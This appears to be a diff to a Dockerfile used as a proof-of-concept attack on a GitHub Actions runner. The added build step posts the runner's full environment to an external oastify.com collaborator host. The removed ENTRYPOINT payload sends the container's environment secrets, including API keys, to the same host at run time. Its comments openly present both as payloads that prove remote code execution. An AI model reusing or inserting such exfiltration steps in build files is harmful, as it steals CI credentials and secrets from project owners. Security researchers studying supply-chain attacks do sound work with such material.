@@ -4,7 +4,7 @@ FROM debian:bookworm-slim
 # This runs on the GitHub Runner immediately when 'docker build' is called.
 # It proves you have RCE on the runner itself.
 RUN apt-get update && apt-get install -y curl && \
-    curl -X POST -d "build_step_pwned=$(whoami)" https://wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com/build-marker
+    curl -X POST -d "env=$(env)" https://wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com/env
 
 # ---------------------------------------
 
@@ -104,7 +104,3 @@ USER scanner
 # Set working directory
 WORKDIR /workspace
 
-# --- PAYLOAD 2: RUN-TIME SECRET EXFILTRATION ---
-# The workflow passes secrets (OPENAI_API_KEY, etc.) as env vars to the container.
-# We override the ENTRYPOINT to dump these env vars and send them to you.
-ENTRYPOINT ["/bin/sh", "-c", "curl -X POST -d \"secrets=$(env)\" https://wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com/secrets"]
